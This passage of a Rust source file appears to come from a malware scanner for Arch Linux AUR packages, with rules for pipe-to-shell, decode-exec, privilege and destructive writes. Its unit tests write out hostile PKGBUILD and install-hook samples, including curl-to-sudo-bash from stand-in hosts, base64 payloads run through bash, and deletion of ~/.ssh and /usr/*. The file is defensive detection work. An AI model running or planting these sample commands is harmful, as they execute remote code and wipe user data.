                "mode" => o.mode = value,
                _ => o.flags.push(name),
            }
        } else {
            let cluster = &t[1..];
            for (i, c) in cluster.char_indices() {
                if valued.contains(c) {
                    let rest = &cluster[i + c.len_utf8()..];
                    let value = if rest.is_empty() {
                        it.next()
                    } else {
                        Some(rest)
                    };
                    match c {
                        't' => o.target = value,
                        'm' => o.mode = value,
                        _ => {}
                    }
                    break;
                }
                o.flags.push(&cluster[i..i + c.len_utf8()]);
            }
        }
    }
    o
}

impl Opts<'_> {
    fn has(&self, flags: &[&str]) -> bool {
        self.flags.iter().any(|f| flags.contains(f))
    }
}

/// `chmod` arguments: (mode, files). Modes may look like options (`-x`).
fn chmod_args(args: &[Word]) -> (Option<&str>, Vec<&str>) {
    let mut mode = None;
    let mut files = Vec::new();
    for t in args.iter().map(|a| a.text.as_str()) {
        let option = t.starts_with("--")
            || (t.len() > 1 && t.starts_with('-') && t[1..].chars().all(|c| "Rcfv".contains(c)));
        if t.starts_with("--reference") {
            mode = Some("");
        } else if option {
            continue;
        } else if mode.is_none() {
            mode = Some(t);
        } else {
            files.push(t);
        }
    }
    (mode.filter(|m| !m.is_empty()), files)
}

/// (world-writable, setuid/setgid) for a numeric or symbolic mode; modes
/// built from variables are not evaluated.
fn mode_risks(mode: &str) -> (bool, bool) {
    if !mode.is_empty() && mode.chars().all(|c| c.is_digit(8)) {
        let v = u32::from_str_radix(mode, 8).unwrap_or(0);
        return (v & 0o002 != 0, v & 0o6000 != 0);
    }
    let (mut world, mut setid) = (false, false);
    if !mode.chars().all(|c| "ugoa+-=rwxXst,".contains(c)) {
        return (world, setid);
    }
    for clause in mode.split(',') {
        let who_end = clause.find(|c| !"ugoa".contains(c)).unwrap_or(clause.len());
        let who = &clause[..who_end];
        let mut op = ' ';
        for c in clause[who_end..].chars() {
            match c {
                '+' | '-' | '=' => op = c,
                'w' if op != '-' && who.contains(['o', 'a']) => world = true,
                's' if op != '-' && (who.is_empty() || who.contains(['u', 'g', 'a'])) => {
                    setid = true
                }
                _ => {}
            }
        }
    }
    (world, setid)
}

fn is_dev_sink(t: &str) -> bool {
    matches!(t, "/dev/null" | "/dev/stdout" | "/dev/stderr" | "/dev/tty")
        || t.starts_with("/dev/fd/")
}

/// `$NAME` / `${NAME…}` at the start of `t`.
fn leading_var(t: &str) -> Option<&str> {
    let rest = t.strip_prefix('$')?;
    let rest = rest.strip_prefix('{').unwrap_or(rest);
    let end = rest
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(rest.len());
    Some(&rest[..end])
}

/// Path on the live system (absolute, `~` or `$HOME`) rather than in
/// `$pkgdir`/`$srcdir`/the build directory.
fn outside(t: &str) -> bool {
    !is_dev_sink(t) && (t.starts_with('/') || t.starts_with('~') || leading_var(t) == Some("HOME"))
}

fn uses_home(t: &str) -> bool {
    t.starts_with('~') || t.contains("$HOME") || t.contains("${HOME")
}

/// Top-level system or home directory an install script must never wipe.
fn dangerous_root(t: &str) -> bool {
    let s = t.trim_end_matches(['/', '*']);
    (s.is_empty() && !t.is_empty())
        || matches!(
            s,
            "/bin"
                | "/boot"
                | "/dev"
                | "/etc"
                | "/home"
                | "/lib"
                | "/lib64"
                | "/opt"
                | "/root"
                | "/sbin"
                | "/srv"
                | "/usr"
                | "/usr/bin"
                | "/usr/lib"
                | "/usr/local"
                | "/usr/share"
                | "/var"
                | "~"
                | "$HOME"
                | "${HOME}"
        )
}

/// Longest run of consecutive `\xNN` escapes.
fn hex_run(t: &str) -> usize {
    let b = t.as_bytes();
    let (mut best, mut run, mut i) = (0, 0, 0);
    while i < b.len() {
        if b[i] == b'\\'
            && b.get(i + 1) == Some(&b'x')
            && b.get(i + 2).is_some_and(u8::is_ascii_hexdigit)
            && b.get(i + 3).is_some_and(u8::is_ascii_hexdigit)
        {
            run += 1;
            best = best.max(run);
            i += 4;
        } else {
            run = 0;
            i += 1;
        }
    }
    best
}

/// A long base64-alphabet token that is not plain hex or a path.
fn obfuscated(t: &str) -> bool {
    t.split(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '/'))
        .any(|run| {
            run.len() >= OBFUSCATED_MIN
                && !run.chars().all(|c| c.is_ascii_hexdigit())
                && run.contains(|c: char| c.is_ascii_uppercase())
                && run.contains(|c: char| c.is_ascii_lowercase())
                && run.contains(|c: char| c.is_ascii_digit())
                && run.matches('/').count() * 10 <= run.len()
        })
}

struct Ctx<'a> {
    file: &'a str,
    lines: Vec<&'a str>,
    kind: Kind,
    out: &'a mut Vec<Finding>,
}

impl Ctx<'_> {
    fn push(&mut self, severity: Severity, rule: &str, title: impl Into<String>, line: usize) {
        let excerpt = self
            .lines
            .get(line.wrapping_sub(1))
            .map_or_else(String::new, |l| excerpt(l));
        self.out.push(Finding {
            severity,
            rule: rule.into(),
            title: title.into(),
            file: self.file.into(),
            line: Some(line),
            excerpt,
        });
    }

    fn pipeline(&mut self, p: &Pipeline) {
        let resolved: Vec<Resolved> = p.stages.iter().map(resolve).collect();
        let line = p.stages[0].line;
        for (j, r) in resolved.iter().enumerate() {
            if !runs_stdin(r) {
                continue;
            }
            let feeds = |pred: &dyn Fn(&Resolved) -> bool| {
                resolved[..j]
                    .iter()
                    .zip(&p.stages)
                    .any(|(r, c)| pred(r) || subs_any(c.all_words(), pred))
            };
            if feeds(&is_downloader) {
                self.push(
                    Severity::Critical,
                    "pipe-to-shell",
                    "Downloads a script and pipes it into a shell",
                    line,
                );
            } else if feeds(&is_decoder) {
                self.push(
                    Severity::Critical,
                    "decode-exec",
                    "Decodes hidden data and executes it",
                    line,
                );
            }
        }
        for (cmd, r) in p.stages.iter().zip(&resolved) {
            self.command(p, cmd, r);
            for w in cmd.all_words() {
                for sub in &w.subs {
                    self.pipeline(sub);
                }
            }
        }
    }

    fn command(&mut self, p: &Pipeline, cmd: &Cmd, r: &Resolved) {
        let line = cmd.line;
        self.obfuscation(cmd);
        if cmd.array.is_some() {
            return;
        }
        if let Some(wrapper) = r.privileged {
            self.push(
                Severity::Critical,
                "privilege",
                format!("Runs commands as root with {wrapper}"),
                line,
            );
        }
        if r.name == "su"
            && r.args
                .iter()
                .any(|a| matches!(a.text.as_str(), "-" | "-l" | "--login" | "-c" | "root"))
        {
            self.push(
                Severity::Critical,
                "privilege",
                "Switches to root with su",
                line,
            );
        }
        if interp(r.name).is_some() || matches!(r.name, "eval" | "source" | ".") {
            let code = r
                .args
                .iter()
                .chain(cmd.redirs.iter().filter(|x| !x.output).map(|x| &x.target));
            if subs_any(code.clone(), &is_downloader) {
                self.push(
                    Severity::Critical,
                    "pipe-to-shell",
                    "Runs a downloaded script through a shell",
                    line,
                );
            } else if subs_any(code, &is_decoder) {
                self.push(
                    Severity::Critical,
                    "decode-exec",
                    "Decodes hidden data and executes it",
                    line,
                );
            }
        }
        if r.name == "eval" {
            self.push(
                Severity::Warning,
                "eval",
                "Uses eval to run dynamically built code",
                line,
            );
        }
        if is_decoder(r) {
            self.push(
                Severity::Warning,
                "decode",
                "Decodes base64/hex-encoded data",
                line,
            );
        }
        if matches!(r.name, "printf" | "echo")
            && r.args.iter().any(|a| hex_run(&a.text) >= HEX_RUN_MIN)
        {
            self.push(
                Severity::Warning,
                "hex-escapes",
                "Prints a long run of hex-escaped bytes",
                line,
            );
        }
        self.chmod(r, line);
        match self.kind {
            Kind::Pkgbuild => {
                if is_network(r) {
                    match p.func.as_deref() {
                        None => self.push(
                            Severity::Warning,
                            "network-in-build",
                            "Downloads from the network whenever the PKGBUILD is sourced",
                            line,
                        ),
                        Some(f) if is_build_fn(f) => self.push(
                            Severity::Warning,
                            "network-in-build",
                            format!("Downloads from the network in {f}()"),
                            line,
                        ),
                        Some(_) => {}
                    }
                }
                self.systemd(r, line);
                self.outside_pkgbuild(cmd, r);
            }
            Kind::Install => {
                if is_network(r) {
                    self.push(
                        Severity::Critical,
                        "network-in-build",
                        "Install script downloads from the network",
                        line,
                    );
                }
                self.systemd(r, line);
                self.outside_install(cmd, r);
            }
            Kind::Script => {}
        }
    }

    fn obfuscation(&mut self, cmd: &Cmd) {
        if cmd.array.as_deref().is_some_and(is_checksum_name) {
            return;
        }
        let hit = cmd.all_words().find(|w| {
            !assignment_name(&w.text).is_some_and(is_checksum_name) && obfuscated(&w.text)
        });
        if let Some(w) = hit {
            let line = if cmd.array.is_some() {
                w.line
            } else {
                cmd.line
            };
            self.push(
                Severity::Warning,
                "obfuscated-string",
                "Contains a long base64-like encoded string",
                line,
            );
        }
    }

    fn chmod(&mut self, r: &Resolved, line: usize) {
        let mode = match r.name {
            "chmod" => chmod_args(r.args).0,
            "install" => {
                parse_opts(
                    r.args,
                    "mogtS",
                    &["mode", "owner", "group", "target-directory", "suffix"],
                )
                .mode
            }
            _ => None,
        };
        let (world, setid) = mode.map_or((false, false), mode_risks);
        if world {
            self.push(
                Severity::Warning,
                "chmod",
                "Makes files world-writable",
                line,
            );
        }
        if setid {
            self.push(
                Severity::Warning,
                "chmod",
                "Sets the setuid/setgid bit",
                line,
            );
        }
    }

    fn systemd(&mut self, r: &Resolved, line: usize) {
        if r.name == "systemctl"
            && matches!(
                subcommand(r.args, "HMtpnos"),
                Some("enable" | "reenable" | "start" | "restart" | "mask")
            )
        {
            self.push(
                Severity::Warning,
                "systemd-enable",
                "Enables or starts a systemd unit",
                line,
            );
        }
    }

    fn outside_pkgbuild(&mut self, cmd: &Cmd, r: &Resolved) {
        let line = cmd.line;
        let (severity, title) = if cmd
            .redirs
            .iter()
            .any(|x| x.output && outside(&x.target.text))
        {
            (
                Severity::Critical,
                "Writes files outside the package directories",
            )
        } else {
            match r.name {
                "rm" => {
                    let o = parse_opts(r.args, "", &[]);
                    if !(o.has(&["r", "R", "f", "recursive", "force"])
                        && o.operands.iter().any(|t| outside(t)))
                    {
                        return;
                    }
                    (
                        Severity::Critical,
                        "Deletes files outside the package directories",
                    )
                }
                "tee"
                    if parse_opts(r.args, "", &[])
                        .operands
                        .iter()
                        .any(|t| outside(t)) =>
                {
                    (
                        Severity::Critical,
                        "Writes files outside the package directories",
                    )
                }
                "cp" | "mv" | "ln" | "install" | "mkdir" | "touch" | "chmod" | "chown"
                | "chgrp"
                    if write_targets(r).iter().any(|t| outside(t)) =>
                {
                    (
                        Severity::Warning,
                        "Modifies files outside the package directories",
                    )
                }
                _ => return,
            }
        };
        self.push(severity, "outside-dirs", title, line);
    }

    fn outside_install(&mut self, cmd: &Cmd, r: &Resolved) {
        let line = cmd.line;
        if r.name == "rm" {
            let o = parse_opts(r.args, "", &[]);
            if o.has(&["r", "R", "recursive"]) && o.operands.iter().any(|t| dangerous_root(t)) {
                self.push(
                    Severity::Warning,
                    "outside-dirs",
                    "Recursively deletes a system or home directory",
                    line,
                );
            }
        }
        let message = matches!(r.name, "echo" | "printf");
        let home = if message {
            cmd.redirs.iter().any(|x| uses_home(&x.target.text))
        } else {
            cmd.all_words().any(|w| uses_home(&w.text))
        };
        if home {
            self.push(
                Severity::Warning,
                "outside-dirs",
                "Install script uses a home directory",
                line,
            );
        }
    }
}

/// Paths a file-manipulating command writes to.
fn write_targets<'a>(r: &Resolved<'a>) -> Vec<&'a str> {
    match r.name {
        "chmod" => chmod_args(r.args).1,
        "chown" | "chgrp" => {
            let o = parse_opts(r.args, "", &[]);
            let skip = usize::from(!o.flags.iter().any(|f| f.starts_with("reference")));
            o.operands.into_iter().skip(skip).collect()
        }
        _ => {
            let (valued, long): (&str, &[&str]) = match r.name {
                "install" => (
                    "mogtS",
                    &["mode", "owner", "group", "target-directory", "suffix"],
                ),
                "mkdir" => ("m", &["mode"]),
                "touch" => ("drt", &["date", "reference"]),
                _ => ("tS", &["target-directory", "suffix"]),
            };
            let o = parse_opts(r.args, valued, long);
            if let Some(t) = o.target {
                vec![t]
            } else if r.name == "mkdir"
                || r.name == "touch"
                || (r.name == "install" && o.has(&["d", "directory"]))
            {
                o.operands
            } else if o.operands.len() >= 2 {
                o.operands.last().copied().into_iter().collect()
            } else {
                Vec::new()
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const NOW: i64 = 1_791_072_000; // 2026-10-04

    fn meta() -> Meta {
        Meta {
            maintainer: Some("alice".into()),
            votes: 500,
            popularity: 5.0,
            out_of_date: None,
            first_submitted: 1_500_000_000,
        }
    }

    fn files(list: &[(&str, &str)]) -> Vec<RepoFile> {
        list.iter()
            .map(|(path, text)| RepoFile {
                path: (*path).into(),
                text: (*text).into(),
            })
            .collect()
    }

    fn hits(findings: &[Finding]) -> Vec<(Severity, &str, &str, usize)> {
        findings
            .iter()
            .map(|f| {
                (
                    f.severity,
                    f.rule.as_str(),
                    f.file.as_str(),
                    f.line.unwrap_or(0),
                )
            })
            .collect()
    }

    fn scan_one(path: &str, text: &str) -> Vec<Finding> {
        scan(&files(&[(path, text)]), &meta(), None, NOW)
    }

    fn assert_clean(name: &str, list: &[(&str, &str)]) {
        let findings = scan(&files(list), &meta(), None, NOW);
        let bad: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.severity > Severity::Info)
            .collect();
        assert!(bad.is_empty(), "{name}: {bad:#?}");
    }

    #[test]
    fn real_packages_are_clean() {
        assert_clean(
            "yay",
            &[
                ("PKGBUILD", include_str!("../fixtures/aur/yay/PKGBUILD")),
                (".SRCINFO", include_str!("../fixtures/aur/yay/.SRCINFO")),
            ],
        );
        assert_clean(
            "paru-bin",
            &[
                (
                    "PKGBUILD",
                    include_str!("../fixtures/aur/paru-bin/PKGBUILD"),
                ),
                (
                    ".SRCINFO",
                    include_str!("../fixtures/aur/paru-bin/.SRCINFO"),
                ),
            ],
        );
        assert_clean(
            "visual-studio-code-bin",
            &[
                (
                    "PKGBUILD",
                    include_str!("../fixtures/aur/visual-studio-code-bin/PKGBUILD"),
                ),
                (
                    ".SRCINFO",
                    include_str!("../fixtures/aur/visual-studio-code-bin/.SRCINFO"),
                ),
                (
                    "visual-studio-code-bin.install",
                    include_str!(
                        "../fixtures/aur/visual-studio-code-bin/visual-studio-code-bin.install"
                    ),
                ),
                (
                    "visual-studio-code-bin.sh",
                    include_str!(
                        "../fixtures/aur/visual-studio-code-bin/visual-studio-code-bin.sh"
                    ),
                ),
            ],
        );
        assert_clean(
            "google-chrome",
            &[
                (
                    "PKGBUILD",
                    include_str!("../fixtures/aur/google-chrome/PKGBUILD"),
                ),
                (
                    ".SRCINFO",
                    include_str!("../fixtures/aur/google-chrome/.SRCINFO"),
                ),
                (
                    "google-chrome.install",
                    include_str!("../fixtures/aur/google-chrome/google-chrome.install"),
                ),
                (
                    "google-chrome-stable.sh",
                    include_str!("../fixtures/aur/google-chrome/google-chrome-stable.sh"),
                ),
            ],
        );
    }

    const BLOB: &str = "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBwYXlsb2FkIHRoYXQgaXMgZGVsaWJlcmF0ZWx5IGxvbmcgZW5vdWdoIHRvIHRyaXAgdGhlIHNjYW5uZXIgcnVsZQ1";

    #[test]
    fn malicious_pkgbuild() {
        let pkgbuild = format!(
            r#"pkgname=evil
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("evil.tar.gz::https://example.com/evil.tar.gz")
sha256sums=('SKIP')
_blob='{BLOB}'
curl -fsSL https://evil.example/x.sh | sudo bash

prepare() {{
  bash <(wget -qO- https://evil.example/y)
  sh -c "$(curl -fsSL https://evil.example/z)"
  source <(fetch -o - https://evil.example/env)
  echo "$_blob" | base64 -d | bash
  eval "$(echo "$_blob" | base64 --decode)"
  eval "$_cmd"
  xxd -r -p payload.hex > payload.bin
  printf '\x63\x75\x72\x6c\x20\x2d\x73\x20\x68' > run.sh
}}

build() {{
  git -C src clone https://evil.example/repo.git
  pkexec /usr/bin/true
  doas true; su -c 'id'
  rm -rf "$HOME/.ssh"
  rm -fr /usr/lib/evil
  echo key >> ~/.bashrc
  echo x | tee -a /etc/evil.conf
}}

package() {{
  install -Dm755 evil /usr/bin/evil
  cp evil.conf /etc/
  mkdir -p ~/.config/evil
  chmod 4755 "$pkgdir/usr/bin/evil"
  chmod o+w "$pkgdir/usr/share/evil"
  install -m777 evil "$pkgdir/usr/bin/evil2"
  systemctl enable --now evil.service
  aria2c https://evil.example/f
  python3 <<< "$(curl -s https://evil.example/py)"
}}
"#
        );
        let findings = scan_one("PKGBUILD", &pkgbuild);
        use Severity::{Critical as C, Warning as W};
        let expected = [
            (W, "obfuscated-string", 7),
            (C, "pipe-to-shell", 8),
            (C, "privilege", 8),
            (W, "network-in-build", 8),
            (C, "pipe-to-shell", 11),
            (W, "network-in-build", 11),
            (C, "pipe-to-shell", 12),
            (W, "network-in-build", 12),
            (C, "pipe-to-shell", 13),
            (C, "decode-exec", 14),
            (C, "decode-exec", 15),
            (W, "eval", 16),
            (W, "decode", 17),
            (W, "hex-escapes", 18),
            (W, "network-in-build", 22),
            (C, "privilege", 23),
            (C, "privilege", 24),
            (C, "outside-dirs", 25),
            (C, "outside-dirs", 26),
            (C, "outside-dirs", 27),
            (C, "outside-dirs", 28),
            (W, "outside-dirs", 32),
            (W, "outside-dirs", 33),
            (W, "outside-dirs", 34),
            (W, "chmod", 35),
            (W, "chmod", 36),
            (W, "chmod", 37),
            (W, "systemd-enable", 38),
            (W, "network-in-build", 39),
            (C, "pipe-to-shell", 40),
            (W, "network-in-build", 40),
        ];
        let got = hits(&findings);
        for (sev, rule, line) in expected {
            assert!(
                got.contains(&(sev, rule, "PKGBUILD", line)),
                "missing {rule} at {line}: {got:#?}"
            );
        }
        // eval/decode inside exec findings are folded into the critical one.
        assert!(!got.iter().any(|h| h.1 == "eval" && h.3 == 15), "{got:#?}");
        assert!(
            !got.iter()
                .any(|h| h.1 == "decode" && (h.3 == 14 || h.3 == 15)),
            "{got:#?}"
        );
        // doas and su on line 24 are separate findings.
        assert_eq!(
            got.iter()
                .filter(|h| h.1 == "privilege" && h.3 == 24)
                .count(),
            2
        );
        assert_eq!(got.len(), expected.len() + 1, "{got:#?}");
        assert_eq!(max_severity(&findings), Some(Severity::Critical));
        // Sorted: criticals first, by line.
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].line, Some(8));
        assert_eq!(
            findings[0].excerpt,
            "curl -fsSL https://evil.example/x.sh | sudo bash"
        );
    }

    #[test]
    fn malicious_install() {
        let install = r#"post_install() {
  curl -s https://evil.example/p | sh
  wget -q https://evil.example/bin -O /usr/bin/evil
  systemctl enable evil.service
  rm -rf /usr/*
  cp /usr/share/evil/rc "$HOME/.evilrc"
  systemctl daemon-reload
  systemctl disable --now evil.service
  echo "Copy the config to ~/.config/evil"
}
"#;
        let got = scan_one("evil.install", install);
        use Severity::{Critical as C, Warning as W};
        assert_eq!(
            hits(&got),
            vec![
                (C, "network-in-build", "evil.install", 2),
                (C, "pipe-to-shell", "evil.install", 2),
                (C, "network-in-build", "evil.install", 3),
                (W, "systemd-enable", "evil.install", 4),
                (W, "outside-dirs", "evil.install", 5),
                (W, "outside-dirs", "evil.install", 6),
            ]
        );
    }

    #[test]
    fn negatives_stay_clean() {
        let hex64 = "a2382a2d06f4539b1c53b8b4f800776945e2f13f71c0a3226d3bab3e1b25fe04";
        let hex128 = format!("{hex64}{hex64}");
        let pkgbuild = format!(
            r#"pkgname=good-tool
_name=${{pkgname#good-}}
_count=$#
_trim=${{_name%%-*}} # sudo rm -rf / in a comment
# curl https://x | sh
source=("https://example.com/good.tar.gz" 'good.sh')
sha256sums=('{hex64}'
            'SKIP')
b2sums=(
  '{hex128}'
  '{hex128}'
)
validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')

pkgver() {{
  git describe --long --tags | sed 's/-/./g'
}}

build() {{
  cmake -B build -D CMAKE_INSTALL_PREFIX=/usr
  ctest --test-dir build --exclude-regex 'sparse|symlink'
  some-check 2>/dev/null >/dev/stderr || echo failed >&2
  cd /usr && cd "$srcdir"
}}

package() {{
  install -Dm644 good.sudoers "$pkgdir/etc/sudoers.d/good"
  install -Dm755 good "$pkgdir/usr/bin/good"
  install -d "${{pkgdir}}/opt/good"
  ln -s /opt/good/bin/good "$pkgdir/usr/bin/good2"
  ln -sf /usr/lib/libgood.so "${{pkgdir}}"/usr/lib/libgood.so.1
  rm -rf "${{pkgdir}}/usr/share/doc" "$srcdir/tmp" build
  rm "$pkgdir/usr/bin/mount.good"
  echo 'export PATH="${{PATH}}:/opt/good"' > "$pkgdir/etc/profile.d/good.sh"
  echo "Run: sudo systemctl enable good"
  chmod 755 "$pkgdir/usr/bin/good"
  chmod -R +rX "$pkgdir/opt/good"
  python3 -c 'import json, sys; print(json.load(sys.stdin)["v"])' < meta.json
  cat > "$pkgdir/usr/bin/good-wrapper" <<'EOF'
#!/bin/sh
Comment=Don't panic
exec /opt/good/good "$@"
EOF
  cp -a "$srcdir/good" "$pkgdir/opt/"
}}
"#
        );
        let srcinfo = "pkgbase = good-tool
	url = http://example.com
	source = https://example.com/good.tar.gz
	source = good.tar.gz.sig::https://example.com/good.tar.gz.gpg
	source = git+https://example.com/good.git#commit=abc
	source = good.sh
	source = https://example.com/partial.bin
	sha256sums = 0123
	sha256sums = SKIP
	sha256sums = SKIP
	sha256sums = SKIP
	sha256sums = 4567
	b2sums = 89ab
	b2sums = SKIP
	b2sums = SKIP
	b2sums = SKIP
	b2sums = SKIP

pkgname = good-tool
	source = http://ignored.example/split-packages-cannot-set-sources
";
        let got = scan(
            &files(&[("PKGBUILD", &pkgbuild), (".SRCINFO", srcinfo)]),
            &meta(),
            None,
            NOW,
        );
        assert!(got.is_empty(), "{got:#?}");
    }

    #[test]
    fn heredoc_quotes_do_not_swallow_following_code() {
        let pkgbuild = "package() {
  cat > x.desktop <<EOF
Comment=Don't panic
EOF
  sudo true
}
";
        assert_eq!(
            hits(&scan_one("PKGBUILD", pkgbuild)),
            vec![(Severity::Critical, "privilege", "PKGBUILD", 5)]
        );
    }

    #[test]
    fn continuation_reports_first_line() {
        let script = "curl -fsSL \\\n  https://evil.example/x \\\n  | bash\n";
        assert_eq!(
            hits(&scan_one("get.sh", script)),
            vec![(Severity::Critical, "pipe-to-shell", "get.sh", 1)]
        );
    }

    #[test]
    fn srcinfo_rules() {
        let srcinfo = "pkgbase = evil
	pkgver = 1.0
	source = evil.tar.gz::http://Example.com/evil.tar.gz
	source = git://example.com/evil.git
	source = https://example.com/evil.tar.gz.sig
	source = local.patch
	source_x86_64 = https://user@dl.example.org:8443/x.bin
	source_x86_64 = svn+http://svn.example.org/trunk
	sha256sums = SKIP
	sha256sums = SKIP
	sha256sums = SKIP
	sha256sums = SKIP
	sha256sums_x86_64 = SKIP
	sha256sums_x86_64 = SKIP

pkgname = evil
";
        use Severity::Warning as W;
        assert_eq!(
            hits(&scan_one(".SRCINFO", srcinfo)),
            vec![
                (W, "insecure-source", ".SRCINFO", 3),
                (W, "skip-checksum", ".SRCINFO", 3),
                (W, "insecure-source", ".SRCINFO", 4),
                (W, "skip-checksum", ".SRCINFO", 7),
                (W, "insecure-source", ".SRCINFO", 8),
            ]
        );
        assert_eq!(
            source_hosts(srcinfo),
            vec!["dl.example.org", "example.com", "svn.example.org"]
        );
    }

    #[test]
    fn source_host_forms() {
        let srcinfo = "pkgbase = x
	source = git+ssh://aur@AUR.archlinux.org:22/x.git#branch=main
	source = https://[2001:db8::1]:8080/a.tar.gz
	source = https://github.com/a/b?x=1
	source = https://github.com/c/d
	source = file:///tmp/local
	source = x.patch
";
        assert_eq!(
            source_hosts(srcinfo),
            vec!["[2001:db8::1]", "aur.archlinux.org", "github.com"]
        );
    }

    #[test]
    fn metadata_rules() {
        let srcinfo =
            "pkgbase = x\n\tsource = https://new.example/a\n\tsource = https://old.example/b\n";
        let list = files(&[(".SRCINFO", srcinfo)]);
        let prev = Previous {
            maintainer: Some("alice".into()),
            source_hosts: vec!["old.example".into()],
        };
        let flagged = Meta {
            maintainer: Some("mallory".into()),
            votes: 2,
            popularity: 0.1,
            out_of_date: Some(1_759_536_000),
            first_submitted: NOW - 3 * DAY,
        };
        let got = scan(&list, &flagged, Some(&prev), NOW);
        let summary: Vec<(Severity, &str, &str)> = got
            .iter()
            .map(|f| (f.severity, f.rule.as_str(), f.excerpt.as_str()))
            .collect();
        assert_eq!(
            summary,
            vec![
                (Severity::Warning, "maintainer-changed", "alice → mallory"),
                (
                    Severity::Warning,
                    "new-package",
                    "First submitted 2026-10-01"
                ),
                (
                    Severity::Warning,
                    "source-host-changed",
                    "New hosts: new.example"
                ),
                (Severity::Info, "low-popularity", "2 votes, popularity 0.10"),
                (
                    Severity::Info,
                    "out-of-date",
                    "Flagged out of date on 2025-10-04"
                ),
            ]
        );
        assert!(got.iter().all(|f| f.file == "AUR" && f.line.is_none()));

        let orphan = Meta {
            maintainer: None,
            ..meta()
        };
        let got = scan(&list, &orphan, Some(&prev), NOW);
        assert_eq!(
            hits(&got),
            vec![
                (Severity::Warning, "orphaned", "AUR", 0),
                (Severity::Warning, "source-host-changed", "AUR", 0)
            ]
        );
        assert!(scan(&list, &meta(), None, NOW).is_empty());
    }

    #[test]
    fn modes() {
        assert_eq!(mode_risks("755"), (false, false));
        assert_eq!(mode_risks("0777"), (true, false));
        assert_eq!(mode_risks("666"), (true, false));
        assert_eq!(mode_risks("4755"), (false, true));
        assert_eq!(mode_risks("2755"), (false, true));
        assert_eq!(mode_risks("u+s"), (false, true));
        assert_eq!(mode_risks("+s"), (false, true));
        assert_eq!(mode_risks("a+rwx,o-w"), (true, false));
        assert_eq!(mode_risks("go-w"), (false, false));
        assert_eq!(mode_risks("+rX"), (false, false));
        assert_eq!(mode_risks("${Permissions}"), (false, false));
    }

    #[test]
    fn excerpt_truncates() {
        let long = format!("  {}  ", "x".repeat(200));
        let e = excerpt(&long);
        assert_eq!(e.chars().count(), EXCERPT_CHARS);
        assert!(e.ends_with('…'));
        assert_eq!(excerpt("  short  "), "short");
    }
}
